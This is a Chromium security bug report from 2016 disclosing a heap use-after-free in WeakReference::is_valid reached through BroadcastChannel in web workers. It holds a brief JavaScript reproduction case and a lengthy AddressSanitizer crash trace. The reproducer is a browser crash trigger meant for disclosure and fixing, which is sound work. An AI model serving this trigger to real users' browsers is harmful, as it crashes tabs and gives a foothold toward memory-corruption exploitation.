# Security: BroadcastChannel - Use After Free in WeakReference::is_valid()

| Field | Value |
|-------|-------|
| **Issue ID** | [40085492](https://issues.chromium.org/issues/40085492) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Messaging, Internals>Mojo |
| **Reporter** | lo...@gmail.com |
| **Assignee** | pe...@chromium.org |
| **Created** | 2016-09-23 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Steps to reproduce:

```
1. Run server side script UAF_is_valid_Repro.js in Node.js (node UAF_is_valid_Repro.js ).  
2. Enter http://localhost:12345 in Chrome browser ASAN build.  
3.ASAN reports a Use After Free in WeakReference::is_valid().  

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\c\b\Win_ASan_Release\src\base\memory\weak_ptr.cc:47 in base::internal::WeakReference::is_valid  

```

**VERSION**  

Chrome Version: Chromium Chromium 55.0.2867.0 (Developer Build) (32-bit)  

( <https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/win32-release%2Fasan-win32-release-419839.zip?generation=1474445370804000&alt=media> )  

Operating System: Windows 10

**REPRODUCTION CASE** (full code in UAF\_is\_valid\_Repro.js)  

var MainPageCode = '<html><script>setTimeout(function(){location.reload()},100+Math.floor(400\*Math.random()));\n';  

MainPageCode += 'var worker0 = new Worker("worker0.js");\n';  

MainPageCode += 'var worker1 = new Worker("worker1.js");\n';  

MainPageCode += '</script></html>\n';

```
var workercode0 = 'var bc0 = new BroadcastChannel("test_channel");\n';  
workercode0 += 'bc0.onmessage = function(event) { delete bc0; bc0 = null; bc0 = new BroadcastChannel("test_channel");}\n';  

var workercode1 = 'var bc0 = new BroadcastChannel("test_channel");\n';  

```

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
=================================================================  
==5080==ERROR: AddressSanitizer: heap-use-after-free on address 0x2fb4eb35 at pc 0x14d6edfa bp 0x02ffdc9c sp 0x02ffdc90  
READ of size 1 at 0x2fb4eb35 thread T0  
==5080==WARNING: Failed to use and restart external symbolizer!  
==5080==\*\*\* WARNING: Failed to initialize DbgHelp!              \*\*\*  
==5080==\*\*\* Most likely this means that the app is already      \*\*\*  
==5080==\*\*\* using DbgHelp, possibly with incompatible flags.    \*\*\*  
==5080==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  
==5080==\*\*\* or produce wrong results.                           \*\*\*  
	#0 0x14d6edf9 in base::internal::WeakReference::is_valid C:\b\c\b\Win_ASan_Release\src\base\memory\weak_ptr.cc:47  
	#1 0x1486e98a in base::internal::CancellationChecker<base::internal::BindState<void (media::cast::UdpTransport::\*)(const scoped_refptr<net::IOBuffer> &, scoped_refptr<base::RefCountedData<std::vector<unsigned char,std::allocator<unsigned char> > > >, const base::Callback<void (),base::internal::CopyMode::Copyable,base::internal::RepeatMode::Repeating> &, int) __attribute__((thiscall)),base::WeakPtr<media::cast::UdpTransport>,scoped_refptr<net::IOBuffer>,scoped_refptr<base::RefCountedData<std::vector<unsigned char,std::allocator<unsigned char> > > >,base::Callback<void (),base::internal::CopyMode::Copyable,base::internal::RepeatMode::Repeating> >,void>::Run C:\b\c\b\Win_ASan_Release\src\base\bind_internal.h:407  
	#2 0x14d1f0ca in base::internal::CallbackBase<base::internal::CopyMode::MoveOnly>::IsCancelled C:\b\c\b\Win_ASan_Release\src\base\callback_internal.cc:63  
	#3 0x189c106c in blink::scheduler::internal::WorkQueue::TakeTaskFromWorkQueue C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\base\work_queue.cc:112  
	#4 0x1899b227 in blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:300  
	#5 0x18997951 in blink::scheduler::TaskQueueManager::DoWork C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:234  
	#6 0x189a0976 in base::internal::Invoker<base::internal::BindState<void (blink::scheduler::TaskQueueManager::\*)(base::TimeTicks, bool) __attribute__((thiscall)),base::WeakPtr<blink::scheduler::TaskQueueManager>,base::TimeTicks,bool>,void ()>::Run C:\b\c\b\Win_ASan_Release\src\base\bind_internal.h:332  
	#7 0x14f370c5 in base::debug::TaskAnnotator::RunTask C:\b\c\b\Win_ASan_Release\src\base\debug\task_annotator.cc:54  
	#8 0x14d4c219 in base::MessageLoop::RunTask C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:488  
	#9 0x14d4e13c in base::MessageLoop::DoWork C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:619  
	#10 0x14f406d4 in base::MessagePumpDefault::Run C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_pump_default.cc:35  
	#11 0x14d4b305 in base::MessageLoop::RunHandler C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:451  
	#12 0x14e7d8ee in base::RunLoop::Run C:\b\c\b\Win_ASan_Release\src\base\run_loop.cc:35  
	#13 0x1c20ea4f in content::RendererMain C:\b\c\b\Win_ASan_Release\src\content\renderer\renderer_main.cc:198  
	#14 0x14c67583 in content::RunNamedProcessTypeMain C:\b\c\b\Win_ASan_Release\src\content\app\content_main_runner.cc:418  
	#15 0x14c68e05 in content::ContentMainRunnerImpl::Run C:\b\c\b\Win_ASan_Release\src\content\app\content_main_runner.cc:786  
	#16 0x14c670d4 in content::ContentMain C:\b\c\b\Win_ASan_Release\src\content\app\content_main.cc:20  
	#17 0xf641180 in ChromeMain C:\b\c\b\Win_ASan_Release\src\chrome\app\chrome_main.cc:85  
	#18 0xe2a2df in MainDllLoader::Launch C:\b\c\b\Win_ASan_Release\src\chrome\app\main_dll_loader_win.cc:168  
	#19 0xe21abd in main C:\b\c\b\Win_ASan_Release\src\chrome\app\chrome_exe_main_win.cc:246  
	#20 0x238610c in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:253  
	#21 0x76a262c3 in BaseThreadInitThunk+0x23 (C:\WINDOWS\System32\KERNEL32.DLL+0x162c3)  
	#22 0x77850608 in RtlSubscribeWnfStateChangeNotification+0x438 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x60608)  
	#23 0x778505d3 in RtlSubscribeWnfStateChangeNotification+0x403 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x605d3)  

0x2fb4eb35 is located 5 bytes inside of 8-byte region [0x2fb4eb30,0x2fb4eb38)  
freed by thread T5237 here:  
	#0 0x236a388 in free e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:44  
	#1 0x14d6f04e in base::internal::WeakReferenceOwner::GetRef C:\b\c\b\Win_ASan_Release\src\base\memory\weak_ptr.cc:59  
	#2 0x1c283389 in base::WeakPtrFactory<content::BlinkInterfaceProviderImpl>::GetWeakPtr C:\b\c\b\Win_ASan_Release\src\base\memory\weak_ptr.h:293  
	#3 0x1c282e91 in content::BlinkInterfaceProviderImpl::getInterface C:\b\c\b\Win_ASan_Release\src\content\renderer\mojo\blink_interface_provider_impl.cc:30  
	#4 0x1b5c0f51 in blink::InterfaceProvider::getInterface<blink::mojom::blink::BroadcastChannelProvider> C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\public\platform\InterfaceProvider.h:24  
	#5 0x1b5bffe7 in blink::`anonymous namespace'::getThreadSpecificProvider C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:29  
	#6 0x1b5bdad8 in blink::BroadcastChannel::BroadcastChannel C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:126  
	#7 0x1b5bd504 in blink::BroadcastChannel::create C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:44  
	#8 0x1af51073 in blink::V8BroadcastChannel::constructorCallback C:\b\c\b\Win_ASan_Release\src\out\Release\gen\blink\bindings\modules\v8\V8BroadcastChannel.cpp:171  
	#9 0x11362aa5 in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\Win_ASan_Release\src\v8\src\api-arguments.cc:19  
	#10 0x115c9375 in v8::internal::`anonymous namespace'::HandleApiCallHelper<1> C:\b\c\b\Win_ASan_Release\src\v8\src\builtins\builtins-api.cc:106  
	#11 0x115c71cb in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\Win_ASan_Release\src\v8\src\builtins\builtins-api.cc:131  
	#12 0x115c65c6 in v8::internal::Builtin_HandleApiCall C:\b\c\b\Win_ASan_Release\src\v8\src\builtins\builtins-api.cc:123  

previously allocated by thread T5238 here:  
	#0 0x236a46c in malloc e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:65  
	#1 0x1ed4c2f1 in operator new f:\dd\vctools\crt\vcstartup\src\heap\new_scalar.cpp:19  
	#2 0x14d6efe2 in base::internal::WeakReferenceOwner::GetRef C:\b\c\b\Win_ASan_Release\src\base\memory\weak_ptr.cc:59  
	#3 0x1c283389 in base::WeakPtrFactory<content::BlinkInterfaceProviderImpl>::GetWeakPtr C:\b\c\b\Win_ASan_Release\src\base\memory\weak_ptr.h:293  
	#4 0x1c282e91 in content::BlinkInterfaceProviderImpl::getInterface C:\b\c\b\Win_ASan_Release\src\content\renderer\mojo\blink_interface_provider_impl.cc:30  
	#5 0x1b5c0f51 in blink::InterfaceProvider::getInterface<blink::mojom::blink::BroadcastChannelProvider> C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\public\platform\InterfaceProvider.h:24  
	#6 0x1b5bffe7 in blink::`anonymous namespace'::getThreadSpecificProvider C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:29  
	#7 0x1b5bdad8 in blink::BroadcastChannel::BroadcastChannel C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:126  
	#8 0x1b5bd504 in blink::BroadcastChannel::create C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:44  
	#9 0x1af51073 in blink::V8BroadcastChannel::constructorCallback C:\b\c\b\Win_ASan_Release\src\out\Release\gen\blink\bindings\modules\v8\V8BroadcastChannel.cpp:171  
	#10 0x11362aa5 in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\Win_ASan_Release\src\v8\src\api-arguments.cc:19  
	#11 0x115c9375 in v8::internal::`anonymous namespace'::HandleApiCallHelper<1> C:\b\c\b\Win_ASan_Release\src\v8\src\builtins\builtins-api.cc:106  
	#12 0x115c71cb in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\Win_ASan_Release\src\v8\src\builtins\builtins-api.cc:131  
	#13 0x115c65c6 in v8::internal::Builtin_HandleApiCall C:\b\c\b\Win_ASan_Release\src\v8\src\builtins\builtins-api.cc:123  

Thread T5237 created by T0 here:  
	#0 0x2375e82 in __asan_wrap_CreateThread e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:123  
	#1 0x14d706cc in base::PlatformThread::CreateWithPriority C:\b\c\b\Win_ASan_Release\src\base\threading\platform_thread_win.cc:193  
	#2 0x14e7bd85 in base::Thread::StartWithOptions C:\b\c\b\Win_ASan_Release\src\base\threading\thread.cc:108  
	#3 0x187ccf39 in blink::scheduler::WebThreadImplForWorkerScheduler::WebThreadImplForWorkerScheduler C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\child\webthread_impl_for_worker_scheduler.cc:31  
	#4 0x187cccb8 in blink::scheduler::WebThreadImplForWorkerScheduler::WebThreadImplForWorkerScheduler C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\child\webthread_impl_for_worker_scheduler.cc:25  
	#5 0x185deada in content::BlinkPlatformImpl::createThread C:\b\c\b\Win_ASan_Release\src\content\child\blink_platform_impl.cc:448  
	#6 0x1e036439 in blink::WebThreadSupportingGC::WebThreadSupportingGC C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\WebThreadSupportingGC.cpp:37  
	#7 0x1e0362e0 in blink::WebThreadSupportingGC::create C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\WebThreadSupportingGC.cpp:17  
	#8 0x1ae07a40 in blink::WorkerBackingThread::WorkerBackingThread C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\WorkerBackingThread.cpp:51  
	#9 0x1ae3c7c0 in blink::DedicatedWorkerThread::DedicatedWorkerThread C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerThread.cpp:52  
	#10 0x1ae3c53c in blink::DedicatedWorkerThread::create C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerThread.cpp:44  
	#11 0x1ae09a37 in blink::DedicatedWorkerMessagingProxy::createWorkerThread C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerMessagingProxy.cpp:24  
	#12 0x1ae3d129 in blink::ThreadedMessagingProxyBase::initializeWorkerThread C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\ThreadedMessagingProxyBase.cpp:56  
	#13 0x1ae37e5e in blink::InProcessWorkerMessagingProxy::startWorkerGlobalScope C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\InProcessWorkerMessagingProxy.cpp:111  
	#14 0x1ae1be8b in blink::InProcessWorkerBase::onFinished C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\InProcessWorkerBase.cpp:111  
	#15 0x1ae43567 in blink::WorkerScriptLoader::notifyFinished C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\WorkerScriptLoader.cpp:229  
	#16 0x1ae44e44 in blink::WorkerScriptLoader::didFinishLoading C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\WorkerScriptLoader.cpp:187  
	#17 0x1a987a3f in blink::DocumentThreadableLoader::handleSuccessfulFinish C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\loader\DocumentThreadableLoader.cpp:781  
	#18 0x1a984e70 in blink::DocumentThreadableLoader::notifyFinished C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\loader\DocumentThreadableLoader.cpp:758  
	#19 0x19d45015 in blink::Resource::notifyClientsInternal C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:355  
	#20 0x19d44d1b in blink::Resource::checkNotify C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:343  
	#21 0x19d46862 in blink::Resource::finish C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:421  
	#22 0x19d1d6bc in blink::ResourceFetcher::didFinishLoading C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\ResourceFetcher.cpp:961  
	#23 0x19d7955b in blink::ResourceLoader::didFinishLoading C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\ResourceLoader.cpp:182  
	#24 0x1861e451 in content::WebURLLoaderImpl::Context::OnCompletedRequest C:\b\c\b\Win_ASan_Release\src\content\child\web_url_loader_impl.cc:811  
	#25 0x18659515 in content::ResourceDispatcher::OnRequestComplete C:\b\c\b\Win_ASan_Release\src\content\child\resource_dispatcher.cc:426  
	#26 0x1865f918 in IPC::MessageT<ResourceMsg_RequestComplete_Meta,std::tuple<int,content::ResourceRequestCompletionStatus>,void>::Dispatch<content::ResourceDispatcher,content::ResourceDispatcher,void,void (content::ResourceDispatcher::\*)(int, const content::ResourceRequestCompletionStatus &) __attribute__((thiscall))> C:\b\c\b\Win_ASan_Release\src\ipc\ipc_message_templates.h:120  
	#27 0x18653efe in content::ResourceDispatcher::DispatchMessageW C:\b\c\b\Win_ASan_Release\src\content\child\resource_dispatcher.cc:557  
	#28 0x18652e48 in content::ResourceDispatcher::OnMessageReceived C:\b\c\b\Win_ASan_Release\src\content\child\resource_dispatcher.cc:170  
	#29 0x186b780a in base::internal::Invoker<base::internal::BindState<void (content::ResourceSchedulingFilter::\*)(const IPC::Message &) __attribute__((thiscall)),base::WeakPtr<content::ResourceSchedulingFilter>,IPC::Message>,void ()>::Run C:\b\c\b\Win_ASan_Release\src\base\bind_internal.h:340  
	#30 0x14f370c5 in base::debug::TaskAnnotator::RunTask C:\b\c\b\Win_ASan_Release\src\base\debug\task_annotator.cc:54  
	#31 0x1899b956 in blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:337  
	#32 0x18997951 in blink::scheduler::TaskQueueManager::DoWork C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:234  
	#33 0x189a0976 in base::internal::Invoker<base::internal::BindState<void (blink::scheduler::TaskQueueManager::\*)(base::TimeTicks, bool) __attribute__((thiscall)),base::WeakPtr<blink::scheduler::TaskQueueManager>,base::TimeTicks,bool>,void ()>::Run C:\b\c\b\Win_ASan_Release\src\base\bind_internal.h:332  
	#34 0x14f370c5 in base::debug::TaskAnnotator::RunTask C:\b\c\b\Win_ASan_Release\src\base\debug\task_annotator.cc:54  
	#35 0x14d4c219 in base::MessageLoop::RunTask C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:488  
	#36 0x14d4e13c in base::MessageLoop::DoWork C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:619  
	#37 0x14f406d4 in base::MessagePumpDefault::Run C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_pump_default.cc:35  
	#38 0x14d4b305 in base::MessageLoop::RunHandler C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:451  
	#39 0x14e7d8ee in base::RunLoop::Run C:\b\c\b\Win_ASan_Release\src\base\run_loop.cc:35  
	#40 0x1c20ea4f in content::RendererMain C:\b\c\b\Win_ASan_Release\src\content\renderer\renderer_main.cc:198  
	#41 0x14c67583 in content::RunNamedProcessTypeMain C:\b\c\b\Win_ASan_Release\src\content\app\content_main_runner.cc:418  
	#42 0x14c68e05 in content::ContentMainRunnerImpl::Run C:\b\c\b\Win_ASan_Release\src\content\app\content_main_runner.cc:786  
	#43 0x14c670d4 in content::ContentMain C:\b\c\b\Win_ASan_Release\src\content\app\content_main.cc:20  
	#44 0xf641180 in ChromeMain C:\b\c\b\Win_ASan_Release\src\chrome\app\chrome_main.cc:85  
	#45 0xe2a2df in MainDllLoader::Launch C:\b\c\b\Win_ASan_Release\src\chrome\app\main_dll_loader_win.cc:168  
	#46 0xe21abd in main C:\b\c\b\Win_ASan_Release\src\chrome\app\chrome_exe_main_win.cc:246  
	#47 0x238610c in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:253  
	#48 0x76a262c3 in BaseThreadInitThunk+0x23 (C:\WINDOWS\System32\KERNEL32.DLL+0x162c3)  
	#49 0x77850608 in RtlSubscribeWnfStateChangeNotification+0x438 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x60608)  
	#50 0x778505d3 in RtlSubscribeWnfStateChangeNotification+0x403 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x605d3)  

Thread T5238 created by T0 here:  
	#0 0x2375e82 in __asan_wrap_CreateThread e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:123  
	#1 0x14d706cc in base::PlatformThread::CreateWithPriority C:\b\c\b\Win_ASan_Release\src\base\threading\platform_thread_win.cc:193  
	#2 0x14e7bd85 in base::Thread::StartWithOptions C:\b\c\b\Win_ASan_Release\src\base\threading\thread.cc:108  
	#3 0x187ccf39 in blink::scheduler::WebThreadImplForWorkerScheduler::WebThreadImplForWorkerScheduler C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\child\webthread_impl_for_worker_scheduler.cc:31  
	#4 0x187cccb8 in blink::scheduler::WebThreadImplForWorkerScheduler::WebThreadImplForWorkerScheduler C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\child\webthread_impl_for_worker_scheduler.cc:25  
	#5 0x185deada in content::BlinkPlatformImpl::createThread C:\b\c\b\Win_ASan_Release\src\content\child\blink_platform_impl.cc:448  
	#6 0x1e036439 in blink::WebThreadSupportingGC::WebThreadSupportingGC C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\WebThreadSupportingGC.cpp:37  
	#7 0x1e0362e0 in blink::WebThreadSupportingGC::create C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\WebThreadSupportingGC.cpp:17  
	#8 0x1ae07a40 in blink::WorkerBackingThread::WorkerBackingThread C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\WorkerBackingThread.cpp:51  
	#9 0x1ae3c7c0 in blink::DedicatedWorkerThread::DedicatedWorkerThread C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerThread.cpp:52  
	#10 0x1ae3c53c in blink::DedicatedWorkerThread::create C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerThread.cpp:44  
	#11 0x1ae09a37 in blink::DedicatedWorkerMessagingProxy::createWorkerThread C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerMessagingProxy.cpp:24  
	#12 0x1ae3d129 in blink::ThreadedMessagingProxyBase::initializeWorkerThread C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\ThreadedMessagingProxyBase.cpp:56  
	#13 0x1ae37e5e in blink::InProcessWorkerMessagingProxy::startWorkerGlobalScope C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\InProcessWorkerMessagingProxy.cpp:111  
	#14 0x1ae1be8b in blink::InProcessWorkerBase::onFinished C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\InProcessWorkerBase.cpp:111  
	#15 0x1ae43567 in blink::WorkerScriptLoader::notifyFinished C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\WorkerScriptLoader.cpp:229  
	#16 0x1ae44e44 in blink::WorkerScriptLoader::didFinishLoading C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\workers\WorkerScriptLoader.cpp:187  
	#17 0x1a987a3f in blink::DocumentThreadableLoader::handleSuccessfulFinish C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\loader\DocumentThreadableLoader.cpp:781  
	#18 0x1a984e70 in blink::DocumentThreadableLoader::notifyFinished C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\loader\DocumentThreadableLoader.cpp:758  
	#19 0x19d45015 in blink::Resource::notifyClientsInternal C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:355  
	#20 0x19d44d1b in blink::Resource::checkNotify C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:343  
	#21 0x19d46862 in blink::Resource::finish C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:421  
	#22 0x19d1d6bc in blink::ResourceFetcher::didFinishLoading C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\ResourceFetcher.cpp:961  
	#23 0x19d7955b in blink::ResourceLoader::didFinishLoading C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\core\fetch\ResourceLoader.cpp:182  
	#24 0x1861e451 in content::WebURLLoaderImpl::Context::OnCompletedRequest C:\b\c\b\Win_ASan_Release\src\content\child\web_url_loader_impl.cc:811  
	#25 0x18659515 in content::ResourceDispatcher::OnRequestComplete C:\b\c\b\Win_ASan_Release\src\content\child\resource_dispatcher.cc:426  
	#26 0x1865f918 in IPC::MessageT<ResourceMsg_RequestComplete_Meta,std::tuple<int,content::ResourceRequestCompletionStatus>,void>::Dispatch<content::ResourceDispatcher,content::ResourceDispatcher,void,void (content::ResourceDispatcher::\*)(int, const content::ResourceRequestCompletionStatus &) __attribute__((thiscall))> C:\b\c\b\Win_ASan_Release\src\ipc\ipc_message_templates.h:120  
	#27 0x18653efe in content::ResourceDispatcher::DispatchMessageW C:\b\c\b\Win_ASan_Release\src\content\child\resource_dispatcher.cc:557  
	#28 0x18652e48 in content::ResourceDispatcher::OnMessageReceived C:\b\c\b\Win_ASan_Release\src\content\child\resource_dispatcher.cc:170  
	#29 0x186b780a in base::internal::Invoker<base::internal::BindState<void (content::ResourceSchedulingFilter::\*)(const IPC::Message &) __attribute__((thiscall)),base::WeakPtr<content::ResourceSchedulingFilter>,IPC::Message>,void ()>::Run C:\b\c\b\Win_ASan_Release\src\base\bind_internal.h:340  
	#30 0x14f370c5 in base::debug::TaskAnnotator::RunTask C:\b\c\b\Win_ASan_Release\src\base\debug\task_annotator.cc:54  
	#31 0x1899b956 in blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:337  
	#32 0x18997951 in blink::scheduler::TaskQueueManager::DoWork C:\b\c\b\Win_ASan_Release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:234  
	#33 0x189a0976 in base::internal::Invoker<base::internal::BindState<void (blink::scheduler::TaskQueueManager::\*)(base::TimeTicks, bool) __attribute__((thiscall)),base::WeakPtr<blink::scheduler::TaskQueueManager>,base::TimeTicks,bool>,void ()>::Run C:\b\c\b\Win_ASan_Release\src\base\bind_internal.h:332  
	#34 0x14f370c5 in base::debug::TaskAnnotator::RunTask C:\b\c\b\Win_ASan_Release\src\base\debug\task_annotator.cc:54  
	#35 0x14d4c219 in base::MessageLoop::RunTask C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:488  
	#36 0x14d4e13c in base::MessageLoop::DoWork C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:619  
	#37 0x14f406d4 in base::MessagePumpDefault::Run C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_pump_default.cc:35  
	#38 0x14d4b305 in base::MessageLoop::RunHandler C:\b\c\b\Win_ASan_Release\src\base\message_loop\message_loop.cc:451  
	#39 0x14e7d8ee in base::RunLoop::Run C:\b\c\b\Win_ASan_Release\src\base\run_loop.cc:35  
	#40 0x1c20ea4f in content::RendererMain C:\b\c\b\Win_ASan_Release\src\content\renderer\renderer_main.cc:198  
	#41 0x14c67583 in content::RunNamedProcessTypeMain C:\b\c\b\Win_ASan_Release\src\content\app\content_main_runner.cc:418  
	#42 0x14c68e05 in content::ContentMainRunnerImpl::Run C:\b\c\b\Win_ASan_Release\src\content\app\content_main_runner.cc:786  
	#43 0x14c670d4 in content::ContentMain C:\b\c\b\Win_ASan_Release\src\content\app\content_main.cc:20  
	#44 0xf641180 in ChromeMain C:\b\c\b\Win_ASan_Release\src\chrome\app\chrome_main.cc:85  
	#45 0xe2a2df in MainDllLoader::Launch C:\b\c\b\Win_ASan_Release\src\chrome\app\main_dll_loader_win.cc:168  
	#46 0xe21abd in main C:\b\c\b\Win_ASan_Release\src\chrome\app\chrome_exe_main_win.cc:246  
	#47 0x238610c in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:253  
	#48 0x76a262c3 in BaseThreadInitThunk+0x23 (C:\WINDOWS\System32\KERNEL32.DLL+0x162c3)  
	#49 0x77850608 in RtlSubscribeWnfStateChangeNotification+0x438 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x60608)  
	#50 0x778505d3 in RtlSubscribeWnfStateChangeNotification+0x403 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x605d3)  

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\c\b\Win_ASan_Release\src\base\memory\weak_ptr.cc:47 in base::internal::WeakReference::is_valid  
Shadow bytes around the buggy address:  
  0x35f69d10: fa fa 00 fa fa fa 00 00 fa fa fd fa fa fa 00 04  
  0x35f69d20: fa fa 00 00 fa fa 04 fa fa fa 00 fa fa fa 04 fa  
  0x35f69d30: fa fa fa fa fa fa 04 fa fa fa 04 fa fa fa fd fd  
  0x35f69d40: fa fa 00 04 fa fa 04 fa fa fa fd fa fa fa 04 fa  
  0x35f69d50: fa fa fd fa fa fa fd fa fa fa 04 fa fa fa 04 fa  
=>0x35f69d60: fa fa 04 fa fa fa[fd]fa fa fa fa fa fa fa fd fa  
  0x35f69d70: fa fa fa fa fa fa 00 00 fa fa fa fa fa fa 00 fa  
  0x35f69d80: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fd  
  0x35f69d90: fa fa 04 fa fa fa 04 fa fa fa fd fa fa fa 04 fa  
  0x35f69da0: fa fa fd fa fa fa 04 fa fa fa 00 fa fa fa 04 fa  
  0x35f69db0: fa fa fa fa fa fa 00 00 fa fa fd fa fa fa 04 fa  
Shadow byte legend (one shadow byte represents 8 application bytes):  
  Addressable:           00  
  Partially addressable: 01 02 03 04 05 06 07   
  Heap left redzone:       fa  
  Freed heap region:       fd  
  Stack left redzone:      f1  
  Stack mid redzone:       f2  
  Stack right redzone:     f3  
  Stack after return:      f5  
  Stack use after scope:   f8  
  Global redzone:          f9  
  Global init order:       f6  
  Poisoned by user:        f7  
  Container overflow:      fc  
  Array cookie:            ac  
  Intra object redzone:    bb  
  ASan internal:           fe  
  Left alloca redzone:     ca  
